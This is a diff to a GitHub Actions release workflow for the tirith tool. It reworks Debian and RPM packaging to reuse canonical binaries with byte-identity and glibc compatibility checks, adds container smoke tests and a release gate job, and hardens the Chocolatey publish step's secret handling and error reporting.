-          ./crates/tirith/target/release/tirith completions zsh > crates/tirith/assets/completions/_tirith
-          ./crates/tirith/target/release/tirith completions fish > crates/tirith/assets/completions/tirith.fish
-          ./crates/tirith/target/release/tirith manpage > crates/tirith/assets/man/tirith.1
+          cp package-metadata/completions/tirith.bash \
+            crates/tirith/assets/completions/tirith.bash
+          cp package-metadata/completions/_tirith \
+            crates/tirith/assets/completions/_tirith
+          cp package-metadata/completions/tirith.fish \
+            crates/tirith/assets/completions/tirith.fish
+          cp package-metadata/man/tirith.1 crates/tirith/assets/man/tirith.1
+          test -s crates/tirith/assets/completions/tirith.bash
+          test -s crates/tirith/assets/completions/_tirith
+          test -s crates/tirith/assets/completions/tirith.fish
+          test -s crates/tirith/assets/man/tirith.1
 
       - name: Build .deb with cargo-deb
         run: |
-          VERSION="${GITHUB_REF_NAME#v}"
+          set -euo pipefail
           cd crates/tirith
           # --no-strip: package the staged canonical binary byte-for-byte (it is
           # already stripped by [profile.release]); stripping again could perturb
           # bytes and re-break verify-self byte-identity (issue #146).
           CARGO_TARGET_DIR=target cargo deb --no-build --no-strip
-          mv target/debian/*.deb ../../tirith_${VERSION}_amd64.deb
+          mv target/debian/*.deb "../../tirith_${PACKAGE_VERSION}_amd64.deb"
 
       # Guard against issue #146 regressing: the binary inside the .deb MUST be
       # byte-identical to the canonical release binary, or apt users fail
       # `tirith verify-self`.
-      - name: Verify .deb binary matches the canonical release binary
+      - name: Verify every .deb ELF and canonical byte identity
         run: |
           set -euo pipefail
           mkdir -p deb-extract
           dpkg-deb -x tirith_*.deb deb-extract
-          DEB_BIN=$(find deb-extract -type f -name tirith | head -1)
-          if [ -z "$DEB_BIN" ]; then
-            echo "ERROR: no tirith binary found inside the .deb"
-            exit 1
-          fi
-          DEB_SHA=$(sha256sum "$DEB_BIN" | cut -d' ' -f1)
-          CANON_SHA=$(sha256sum crates/tirith/target/release/tirith | cut -d' ' -f1)
-          echo "deb binary:       $DEB_SHA  ($DEB_BIN)"
-          echo "canonical binary: $CANON_SHA"
-          if [ "$DEB_SHA" != "$CANON_SHA" ]; then
-            echo "ERROR: .deb binary does not match the canonical release binary;"
-            echo "       apt-installed tirith would fail 'tirith verify-self' (issue #146)."
-            exit 1
-          fi
+          test -x deb-extract/usr/bin/tirith
           test -x deb-extract/usr/libexec/tirith-package-approval-authority
-          HELPER_DEB_SHA=$(sha256sum deb-extract/usr/libexec/tirith-package-approval-authority | cut -d' ' -f1)
-          HELPER_CANON_SHA=$(sha256sum crates/tirith/target/release/tirith-package-approval-authority | cut -d' ' -f1)
-          test "$HELPER_DEB_SHA" = "$HELPER_CANON_SHA"
-          echo "OK: .deb packages the canonical release binary byte-for-byte"
+          cmp --silent deb-extract/usr/bin/tirith \
+            crates/tirith/target/release/tirith || {
+              echo "ERROR: .deb tirith is not the canonical release binary"
+              exit 1
+            }
+          cmp --silent deb-extract/usr/libexec/tirith-package-approval-authority \
+            crates/tirith/target/release/tirith-package-approval-authority || {
+              echo "ERROR: .deb authority helper is not the canonical release binary"
+              exit 1
+            }
+          bash .github/scripts/verify-glibc-compat.sh x86_64 2.28 deb-extract
+          echo "OK: every .deb ELF is compatible and both shipped executables are canonical"
+
+      - name: Install and smoke-test .deb in pinned Debian 12
+        env:
+          DEBIAN_IMAGE: debian:12-slim@sha256:abd67ffcfa541b485a3dff59865ab629aa048a6c613e639d36e7456b0b229241
+        run: |
+          set -euo pipefail
+          docker run --rm --platform linux/amd64 \
+            -v "${GITHUB_WORKSPACE}:/workspace:ro" \
+            "$DEBIAN_IMAGE" /bin/bash -c '
+              set -euo pipefail
+              dpkg --unpack /workspace/tirith_*.deb
+              /bin/bash /workspace/.github/scripts/smoke-linux-release.sh 2.36 \
+                /usr/bin/tirith /usr/libexec/tirith-package-approval-authority
+            '
 
       - name: Upload Debian package artifact
-        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
         with:
           name: tirith-deb
           path: tirith_*.deb
@@ -927,61 +1216,99 @@ jobs:
   build-rpm:
     name: Build RPM package
     needs: smoke-test
-    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
-    runs-on: ubuntu-latest
+    if: >-
+      github.event_name == 'pull_request' ||
+      github.event_name == 'workflow_dispatch' ||
+      (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v'))
+    runs-on: ubuntu-22.04
     steps:
-      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
           persist-credentials: false
 
-      - name: Build RPM in Rocky Linux container
-        env:
-          VERSION: ${{ github.ref_name }}
-          ROCKY_IMAGE: rockylinux/rockylinux:9@sha256:8101994123cf3d0a8fee517bee7f39e555c7d92bd2d9eb3303cc988a0eeed00f
-          RUSTUP_INIT_VERSION: "1.28.2"
-          RUSTUP_INIT_SHA256: 20a06e644b0d9bd2fbdbfd52d42540bdde820ea7df86e92e533c073da0cdd43c
-          RUST_TOOLCHAIN: "1.97.0"
+      - name: Download canonical Linux x64 release artifact
+        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
+        with:
+          name: tirith-x86_64-unknown-linux-gnu
+          path: canonical
+
+      - name: Download generated completions and manpage
+        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
+        with:
+          name: completions-man
+          path: package-metadata
+
+      - name: Resolve package version
         run: |
-          docker run --rm \
-            -e VERSION \
-            -e RUSTUP_INIT_VERSION \
-            -e RUSTUP_INIT_SHA256 \
-            -e RUST_TOOLCHAIN \
-            -v ${{ github.workspace }}:/workspace \
+          set -euo pipefail
+          package_version=$(awk '
+            /^\[workspace\.package\]$/ { in_workspace_package=1; next }
+            in_workspace_package && /^\[/ { exit }
+            in_workspace_package && /^version[[:space:]]*=/ {
+              gsub(/^[^=]*=[[:space:]]*"|"[[:space:]]*$/, "")
+              print
+              exit
+            }
+          ' Cargo.toml)
+          if [[ ! "$package_version" =~ ^[0-9]+\.[0-9]+\.[0-9]+([.-][0-9A-Za-z.-]+)?$ ]]; then
+            echo "ERROR: invalid workspace package version: $package_version"
+            exit 1
+          fi
+          if [[ "$GITHUB_REF" == refs/tags/v* ]] \
+             && [[ "$GITHUB_REF_NAME" != "v${package_version}" ]]; then
+            echo "ERROR: tag $GITHUB_REF_NAME does not match tirith $package_version"
+            exit 1
+          fi
+          echo "PACKAGE_VERSION=$package_version" >> "$GITHUB_ENV"
+
+      - name: Package canonical binaries in pinned Rocky Linux 9
+        env:
+          ROCKY_IMAGE: rockylinux/rockylinux:9@sha256:8101994123cf3d0a8fee517bee7f39e555c7d92bd2d9eb3303cc988a0eeed00f
+        run: |
+          set -euo pipefail
+          rpm_output="${RUNNER_TEMP}/tirith-rpm-output"
+          mkdir -p "$rpm_output"
+          # Package-tool installation and rpmbuild run with the checkout (and
+          # canonical artifact) read-only. Only the single-purpose output mount
+          # is writable, and the host re-counts its RPMs before copying one out.
+          docker run --rm --platform linux/amd64 \
+            -e PACKAGE_VERSION \
+            -v "${GITHUB_WORKSPACE}:/workspace:ro" \
+            -v "${rpm_output}:/output" \
             -w /workspace \
-            "$ROCKY_IMAGE" bash -c '
+            "$ROCKY_IMAGE" /bin/bash -c '
             set -euo pipefail
-            VER="${VERSION#v}"
 
-            # Install build tools
-            dnf install -y --allowerasing gcc rpm-build curl ca-certificates git
-            RUSTUP_INIT="/tmp/rustup-init-${RUSTUP_INIT_VERSION}"
-            curl --proto "=https" --tlsv1.2 -fsSL \
-              "https://static.rust-lang.org/rustup/archive/${RUSTUP_INIT_VERSION}/x86_64-unknown-linux-gnu/rustup-init" \
-              -o "$RUSTUP_INIT"
-            printf "%s  %s\n" "$RUSTUP_INIT_SHA256" "$RUSTUP_INIT" | sha256sum --check --strict
-            chmod 0755 "$RUSTUP_INIT"
-            "$RUSTUP_INIT" -y --no-modify-path --profile minimal \
-              --default-toolchain "$RUST_TOOLCHAIN"
-            source $HOME/.cargo/env
-            rustc --version | grep -E "^rustc ${RUST_TOOLCHAIN//./\\.} "
+            # rpmbuild is only a packager here. Rust is deliberately absent: a
+            # distro-native relink would raise the GLIBC ceiling and break both
+            # canonical byte identity and EL8 compatibility.
+            dnf install -y --allowerasing \
+              rpm-build cpio binutils diffutils gzip findutils
+            mkdir -p /tmp/canonical
+            tar xzf canonical/tirith-x86_64-unknown-linux-gnu.tar.gz \
+              -C /tmp/canonical tirith tirith-package-approval-authority
+            chmod 0755 /tmp/canonical/tirith \
+              /tmp/canonical/tirith-package-approval-authority
+            /bin/bash .github/scripts/verify-glibc-compat.sh x86_64 2.28 /tmp/canonical
 
-            # Build release binary IN the Rocky container (do NOT swap in the
-            # generic ubuntu-built release binary): the .rpm targets RHEL/Rocky 9
-            # (glibc 2.34) and the canonical binary is built on ubuntu-22.04
-            # (glibc 2.35), which would not run there. The .rpm is therefore
-            # intentionally NOT byte-identical to the tarball; `tirith verify-self`
-            # carves out Dnf installs as source/distro-built (issue #146).
-            cargo build --release --locked -p tirith
-
-            # Generate completions and manpage
-            mkdir -p build/{completions,man,shell/lib}
-            ./target/release/tirith completions bash > build/completions/tirith.bash
-            ./target/release/tirith completions zsh > build/completions/_tirith
-            ./target/release/tirith completions fish > build/completions/tirith.fish
-            ./target/release/tirith manpage > build/man/tirith.1
-            cp shell/tirith.sh build/shell/
-            cp shell/lib/* build/shell/lib/
+            # Reuse the already-validated metadata artifact. The package jobs
+            # should prove package layout and canonical executable bytes, not
+            # run a second completion generator with a different target binary.
+            package_build=/tmp/package-build
+            mkdir -p "$package_build"/{completions,man,shell/lib}
+            cp package-metadata/completions/tirith.bash \
+              "$package_build/completions/tirith.bash"
+            cp package-metadata/completions/_tirith \
+              "$package_build/completions/_tirith"
+            cp package-metadata/completions/tirith.fish \
+              "$package_build/completions/tirith.fish"
+            cp package-metadata/man/tirith.1 "$package_build/man/tirith.1"
+            test -s "$package_build/completions/tirith.bash"
+            test -s "$package_build/completions/_tirith"
+            test -s "$package_build/completions/tirith.fish"
+            test -s "$package_build/man/tirith.1"
+            cp shell/tirith.sh "$package_build/shell/"
+            cp shell/lib/* "$package_build/shell/lib/"
 
             # Prepare RPM build
             mkdir -p ~/rpmbuild/{BUILD,RPMS,SOURCES,SPECS}
@@ -989,30 +1316,174 @@ jobs:
             mkdir -p ~/rpmbuild/SOURCES/completions
             mkdir -p ~/rpmbuild/SOURCES/man
 
-            cp target/release/tirith ~/rpmbuild/SOURCES/
-            cp target/release/tirith-package-approval-authority ~/rpmbuild/SOURCES/
-            cp build/shell/tirith.sh ~/rpmbuild/SOURCES/shell/
-            cp build/shell/lib/* ~/rpmbuild/SOURCES/shell/lib/
-            cp build/completions/* ~/rpmbuild/SOURCES/completions/
-            cp build/man/* ~/rpmbuild/SOURCES/man/
+            cp /tmp/canonical/tirith ~/rpmbuild/SOURCES/
+            cp /tmp/canonical/tirith-package-approval-authority ~/rpmbuild/SOURCES/
+            cp "$package_build/shell/tirith.sh" ~/rpmbuild/SOURCES/shell/
+            cp "$package_build/shell/lib/"* ~/rpmbuild/SOURCES/shell/lib/
+            cp "$package_build/completions/"* ~/rpmbuild/SOURCES/completions/
+            cp "$package_build/man/"* ~/rpmbuild/SOURCES/man/
             cp LICENSE-AGPL ~/rpmbuild/SOURCES/
             cp LICENSE-COMMERCIAL ~/rpmbuild/SOURCES/
 
-            # Update spec version and build
-            sed "s/^Version:.*/Version:        ${VER}/" packaging/rpm/tirith.spec > ~/rpmbuild/SPECS/tirith.spec
-            rpmbuild -bb ~/rpmbuild/SPECS/tirith.spec --define "_topdir $HOME/rpmbuild"
+            # Disable post-install stripping so both packaged ELFs retain the
+            # exact canonical bytes already produced by the release build.
+            sed "s/^Version:.*/Version:        ${PACKAGE_VERSION}/" \
+              packaging/rpm/tirith.spec > ~/rpmbuild/SPECS/tirith.spec
+            rpmbuild -bb ~/rpmbuild/SPECS/tirith.spec \
+              --define "_topdir $HOME/rpmbuild" \
+              --define "__strip /bin/true"
 
-            # Copy RPM to workspace
-            cp ~/rpmbuild/RPMS/x86_64/tirith-*.rpm /workspace/
-            rpm -qlp /workspace/tirith-*.rpm | grep -qx '/usr/libexec/tirith-package-approval-authority'
+            cp ~/rpmbuild/RPMS/x86_64/tirith-*.rpm /output/
+            shopt -s nullglob
+            rpms=(/output/tirith-"${PACKAGE_VERSION}"-*.x86_64.rpm)
+            if [[ ${#rpms[@]} -ne 1 ]]; then
+              echo "ERROR: expected exactly one RPM, found ${#rpms[@]}"
+              exit 1
+            fi
+            rpm -qlp "${rpms[0]}" | grep -qx /usr/bin/tirith
+            rpm -qlp "${rpms[0]}" | grep -qx /usr/libexec/tirith-package-approval-authority
+
+            mkdir -p /tmp/rpm-extract
+            cd /tmp/rpm-extract
+            rpm2cpio "${rpms[0]}" | cpio -idm --quiet
+            cmp --silent usr/bin/tirith /tmp/canonical/tirith || {
+              echo "ERROR: RPM tirith is not the canonical release binary"
+              exit 1
+            }
+            cmp --silent usr/libexec/tirith-package-approval-authority \
+              /tmp/canonical/tirith-package-approval-authority || {
+              echo "ERROR: RPM authority helper is not the canonical release binary"
+              exit 1
+            }
+            /bin/bash /workspace/.github/scripts/verify-glibc-compat.sh \
+              x86_64 2.28 /tmp/rpm-extract
+            echo "OK: every RPM ELF is compatible and both shipped executables are canonical"
           '
 
+          shopt -s nullglob
+          rpms=("$rpm_output"/tirith-"${PACKAGE_VERSION}"-*.x86_64.rpm)
+          if [[ ${#rpms[@]} -ne 1 ]]; then
+            echo "ERROR: expected exactly one RPM output, found ${#rpms[@]}"
+            exit 1
+          fi
+          cp "${rpms[0]}" ./
+
       - name: Upload RPM package artifact
-        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
         with:
           name: tirith-rpm
           path: tirith-*.rpm
           if-no-files-found: error
+
+  rpm-runtime-compat:
+    name: RPM Runtime (${{ matrix.distro }})
+    needs: build-rpm
+    runs-on: ubuntu-22.04
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          - distro: almalinux-8
+            image: "almalinux:8@sha256:4a87d2615a770506e204c27d6248ac97f4df67f4e41e2e9c47c81f0ed0be98cb"
+            glibc: "2.28"
+          - distro: amazonlinux-2023
+            image: "amazonlinux:2023@sha256:181f98c48832fe926f8ca3b6ffeafcce128e96e77b93d08fbe9a9bc9403ce284"
+            glibc: "2.34"
+          - distro: rocky-9
+            image: "rockylinux/rockylinux:9@sha256:8101994123cf3d0a8fee517bee7f39e555c7d92bd2d9eb3303cc988a0eeed00f"
+            glibc: "2.34"
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          persist-credentials: false
+
+      - name: Download canonical Linux x64 release artifact
+        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
+        with:
+          name: tirith-x86_64-unknown-linux-gnu
+          path: canonical
+
+      - name: Download RPM package
+        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
+        with:
+          name: tirith-rpm
+          path: packages
+
+      - name: Extract canonical executable pair
+        run: |
+          set -euo pipefail
+          mkdir -p canonical-root
+          tar xzf canonical/tirith-x86_64-unknown-linux-gnu.tar.gz \
+            -C canonical-root tirith tirith-package-approval-authority
+
+      - name: Install RPM, prove byte identity, and run exact behavior smoke
+        env:
+          RUNTIME_IMAGE: ${{ matrix.image }}
+          EXPECTED_GLIBC: ${{ matrix.glibc }}
+        run: |
+          set -euo pipefail
+          docker run --rm --platform linux/amd64 \
+            -e EXPECTED_GLIBC \
+            -v "${GITHUB_WORKSPACE}/packages:/packages:ro" \
+            -v "${GITHUB_WORKSPACE}/canonical-root:/canonical:ro" \
+            -v "${GITHUB_WORKSPACE}/.github/scripts/smoke-linux-release.sh:/opt/smoke-linux-release.sh:ro" \
+            "$RUNTIME_IMAGE" /bin/bash -c '
+              set -euo pipefail
+              rpm -Uvh --replacepkgs --nodeps /packages/tirith-*.x86_64.rpm
+              installed_tirith_sha=$(sha256sum /usr/bin/tirith)
+              installed_tirith_sha=${installed_tirith_sha%% *}
+              canonical_tirith_sha=$(sha256sum /canonical/tirith)
+              canonical_tirith_sha=${canonical_tirith_sha%% *}
+              if [[ "$installed_tirith_sha" != "$canonical_tirith_sha" ]]; then
+                echo "ERROR: installed RPM tirith differs from the canonical release binary"
+                exit 1
+              fi
+              installed_helper_sha=$(sha256sum \
+                /usr/libexec/tirith-package-approval-authority)
+              installed_helper_sha=${installed_helper_sha%% *}
+              canonical_helper_sha=$(sha256sum \
+                /canonical/tirith-package-approval-authority)
+              canonical_helper_sha=${canonical_helper_sha%% *}
+              if [[ "$installed_helper_sha" != "$canonical_helper_sha" ]]; then
+                echo "ERROR: installed RPM helper differs from the canonical release binary"
+                exit 1
+              fi
+              /bin/bash /opt/smoke-linux-release.sh "$EXPECTED_GLIBC" \
+                /usr/bin/tirith /usr/libexec/tirith-package-approval-authority
+            '
+
+  release-validation:
+    name: Release Compatibility Validation
+    if: always()
+    needs:
+      - smoke-test
+      - linux-runtime-compat
+      - build-deb
+      - build-rpm
+      - rpm-runtime-compat
+    runs-on: ubuntu-22.04
+    steps:
+      - name: Require every build, package, and runtime gate
+        env:
+          SMOKE_RESULT: ${{ needs.smoke-test.result }}
+          GNU_RUNTIME_RESULT: ${{ needs.linux-runtime-compat.result }}
+          DEB_RESULT: ${{ needs.build-deb.result }}
+          RPM_RESULT: ${{ needs.build-rpm.result }}
+          RPM_RUNTIME_RESULT: ${{ needs.rpm-runtime-compat.result }}
+        run: |
+          set -euo pipefail
+          for result in \
+            "$SMOKE_RESULT" \
+            "$GNU_RUNTIME_RESULT" \
+            "$DEB_RESULT" \
+            "$RPM_RESULT" \
+            "$RPM_RUNTIME_RESULT"; do
+            if [[ "$result" != success ]]; then
+              echo "ERROR: a required release-validation dependency finished as: $result"
+              exit 1
+            fi
+          done
+          echo "All release compatibility gates passed; publication remains tag-push-only."
 
   publish-chocolatey:
     name: Publish to Chocolatey
@@ -1020,12 +1491,12 @@ jobs:
     if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
     runs-on: windows-latest
     steps:
-      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
           persist-credentials: false
 
       - name: Download Windows artifact
-        uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4
+        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
         with:
           name: tirith-x86_64-pc-windows-msvc
           path: artifacts
@@ -1056,12 +1527,42 @@ jobs:
       - name: Push to Chocolatey
         shell: pwsh
         continue-on-error: true  # Chocolatey moderation can block pushes; don't fail the release
+        env:
+          # Reach the secret through the environment. Interpolating `${{ }}` into
+          # a run: body splices the value into the script before the shell sees
+          # it, so the expansion is a script-injection surface and the key also
+          # lands in the process command line.
+          CHOCOLATEY_API_KEY: ${{ secrets.CHOCOLATEY_API_KEY }}
         run: |
-          $nupkg = Get-ChildItem -Path ${{ github.workspace }} -Filter "tirith.*.nupkg" | Select-Object -First 1
-          & choco push $nupkg.FullName --source https://push.chocolatey.org/ --api-key ${{ secrets.CHOCOLATEY_API_KEY }}
-          if ($LASTEXITCODE -ne 0) {
-            Write-Warning "Chocolatey push failed (exit $LASTEXITCODE) — previous version may still be in moderation"
+          # `continue-on-error` keeps a moderation hold from failing a release,
+          # but it also let the v0.3.3 push fail with a 403 that nobody saw: the
+          # step went red inside a green job and the version never reached
+          # Chocolatey. Every outcome here is therefore written to the run
+          # summary and raised as an annotation, so the job page says what
+          # happened without anyone opening a log.
+          $summary = $env:GITHUB_STEP_SUMMARY
+          if ([string]::IsNullOrWhiteSpace($env:CHOCOLATEY_API_KEY)) {
+            Write-Output "::warning title=Chocolatey push skipped::CHOCOLATEY_API_KEY is not configured; the release was not pushed to Chocolatey"
+            Add-Content -Path $summary -Value "## Chocolatey`n`n**Skipped**: CHOCOLATEY_API_KEY is not configured."
+            exit 0
           }
+          $nupkg = Get-ChildItem -Path ${{ github.workspace }} -Filter "tirith.*.nupkg" | Select-Object -First 1
+          if (-not $nupkg) {
+            Write-Output "::error title=Chocolatey push failed::no tirith.*.nupkg was produced by the pack step"
+            Add-Content -Path $summary -Value "## Chocolatey`n`n**Failed**: no package was produced to push."
+            exit 1
+          }
+          $output = & choco push $nupkg.FullName --source https://push.chocolatey.org/ --api-key $env:CHOCOLATEY_API_KEY 2>&1 | Out-String
+          $code = $LASTEXITCODE
+          Write-Output $output
+          if ($code -ne 0) {
+            $detail = ($output -split "`n" | Where-Object { $_ -match "status code|forbidden|unauthorized|conflict|moderation|exists" } | Select-Object -First 3) -join "; "
+            if ([string]::IsNullOrWhiteSpace($detail)) { $detail = "exit $code" }
+            Write-Output "::error title=Chocolatey push failed::$($nupkg.Name): $detail. A 403 means the API key is invalid or not authorized for this package; a 409 means the version already exists; a moderation hold on the previous version can also refuse a push. The release itself is unaffected."
+            Add-Content -Path $summary -Value "## Chocolatey`n`n**Failed** to push ``$($nupkg.Name)``: $detail`n`nThe package must be pushed by hand, or the key rotated, before the next tag. See the step log for the full response."
+            exit $code
+          }
+          Add-Content -Path $summary -Value "## Chocolatey`n`nPushed ``$($nupkg.Name)`` to push.chocolatey.org; it now waits for moderation."
 
   publish-aur:
     name: Update AUR Package
@@ -1070,7 +1571,7 @@ jobs:
     runs-on: ubuntu-latest
     continue-on-error: true  # AUR SSH can be transiently unavailable; don't fail the release
     steps:
-      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
           persist-credentials: false
 
@@ -1100,7 +1601,7 @@ jobs:
           sed -i "s/^sha256sums=.*/sha256sums=('${SHA}')/" packaging/aur/PKGBUILD
 
       - name: Publish to AUR
-        uses: KSXGitHub/github-actions-deploy-aur@da03e160361ce01bf087e790b6ffd196d7dccff7 # v4.1.3
+        uses: KSXGitHub/github-actions-deploy-aur@084b0d9b15415bf9cdb65d44dad1efe37a354050 # v4.2.0
         with:
           pkgname: tirith
           pkgbuild: packaging/aur/PKGBUILD
